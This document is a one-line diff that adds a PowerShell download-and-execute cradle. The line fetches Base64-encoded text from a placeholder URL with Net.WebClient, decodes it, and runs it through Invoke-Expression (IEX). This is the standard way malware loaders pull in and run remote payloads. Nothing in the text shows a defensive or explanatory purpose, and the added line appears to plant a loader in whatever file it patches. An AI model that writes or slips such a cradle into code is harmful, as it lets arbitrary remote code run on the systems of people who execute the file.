@@ -1,0 +1,1 @@
+IEX [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('URL')));
